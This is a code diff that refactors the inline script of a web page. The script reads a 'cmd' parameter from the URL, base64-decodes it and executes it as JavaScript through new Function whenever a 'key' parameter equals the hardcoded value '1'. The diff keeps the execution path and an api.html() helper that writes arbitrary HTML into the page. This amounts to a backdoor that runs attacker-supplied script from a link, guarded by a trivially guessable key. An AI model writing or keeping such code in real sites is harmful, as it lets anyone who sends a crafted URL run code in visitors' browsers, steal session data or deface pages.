@@ -15,37 +15,53 @@
     <div class="container"><div id="output"></div></div>
     <script>
         const SECRET_KEY = "1";
+        let originalOutput = '';
         
         function showResult(text, isError) {
-            const line = document.createElement('div');
+            var line = document.createElement('div');
             line.textContent = text;
             line.style.color = isError ? '#ff0000' : '#000000';
             document.getElementById('output').appendChild(line);
         }
         
-        function clearResult() { 
-            document.getElementById('output').innerHTML = ''; 
+        function clearResult() {
+            document.getElementById('output').innerHTML = '';
         }
         
         function resetSite() {
             document.getElementById('output').innerHTML = '';
-            showResult('Site reset to default', false);
+            showResult('Site reset', false);
         }
         
         function executeCode(code) {
             try {
-                const wrappedCode = '(function(){ const api={log:function(msg){const d=document.createElement("div");d.textContent=msg;document.getElementById("output").appendChild(d);},clear:function(){document.getElementById("output").innerHTML="";},html:function(h){document.getElementById("output").innerHTML=h;},reset:function(){resetSite();}};' + code + ';})();';
-                const func = new Function(wrappedCode);
-                func();
+                var api = {
+                    log: function(msg) {
+                        var d = document.createElement('div');
+                        d.textContent = msg;
+                        document.getElementById('output').appendChild(d);
+                    },
+                    clear: function() {
+                        document.getElementById('output').innerHTML = '';
+                    },
+                    html: function(h) {
+                        document.getElementById('output').innerHTML = h;
+                    },
+                    reset: function() {
+                        resetSite();
+                    }
+                };
+                var func = new Function('api', code);
+                func(api);
                 return true;
-            } catch(e) { 
-                showResult('Error: ' + e.message, true); 
-                return false; 
+            } catch(e) {
+                showResult('Error: ' + e.message, true);
+                return false;
             }
         }
         
         function getParams() {
-            const params = new URLSearchParams(window.location.search);
+            var params = new URLSearchParams(window.location.search);
             return { key: params.get('key'), cmd: params.get('cmd'), action: params.get('action') };
         }
         
@@ -54,14 +70,23 @@
         }
         
         function init() {
-            const params = getParams();
+            var params = getParams();
             if (!params.key && !params.cmd && !params.action) return;
-            if (params.key !== SECRET_KEY) { showResult('Wrong key', true); return; }
-            if (params.action === 'reset') { resetSite(); return; }
+            if (params.key !== SECRET_KEY) {
+                showResult('Wrong key', true);
+                return;
+            }
+            if (params.action === 'reset') {
+                resetSite();
+                return;
+            }
             if (params.cmd) {
-                const decoded = decodeBase64(params.cmd);
-                if (decoded) executeCode(decoded);
-                else showResult('Decode error', true);
+                var decoded = decodeBase64(params.cmd);
+                if (decoded) {
+                    executeCode(decoded);
+                } else {
+                    showResult('Decode error', true);
+                }
             }
         }
         init();
